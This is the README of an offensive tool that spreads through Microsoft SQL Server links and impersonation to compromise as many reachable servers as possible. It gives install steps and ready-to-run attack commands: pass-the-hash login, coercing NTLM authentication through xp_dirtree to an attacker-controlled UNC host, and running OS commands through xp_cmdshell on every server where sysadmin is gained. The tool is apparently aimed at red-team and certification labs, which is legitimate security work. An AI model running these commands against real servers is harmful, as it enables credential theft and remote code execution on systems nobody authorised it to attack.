# mssql-spider

![Screenshot](./assets/demo.png)

An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that exploits user impersonation and follows linked instances to discover and compromise as many Microsoft SQL Servers as it can reach.

Big thanks to the developers of fortra/impacket#1397, [SQLRecon](https://github.com/skahwah/SQLRecon) and [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) on which this project is based.

> **Warning:** Although this project was successfully tested in the lab and solves the OSEP Challenge Lab 2 automatically, it is still kinda work in progress.

# Setup

a) With [pipx](https://github.com/pypa/pipx).

~~~ bash
pipx install git+https://github.com/dadevel/mssql-spider.git@main
~~~

b) With [pip](https://github.com/pypa/pip).

~~~ bash
pip install --user git+https://github.com/dadevel/mssql-spider.git@main
~~~

# Usage

Impersonate users and follow linked instances recursively.

~~~ bash
mssql-spider -u jdoe -p passw0rd -w db01.corp.local
~~~

Coerce NTLM authentication from all reachable hosts trough `xp_dirtree`.
This does not require privileged access.

~~~ bash
mssql-spider -u jdoe -H :b9f917853e3dbf6e6831ecce60725930 -w --xpdir \\attacker.corp.local\test ./mssql-servers.txt
~~~

Execute a command on all hosts where you can obtain sysadmin privileges trough `xp_cmdshell`.

~~~ bash
mssql-spider -k -n -w -x 'whoami /groups' db01.corp.local:50123 db02.corp.com:1433
~~~

Run `mssql-spider --help` for more details.
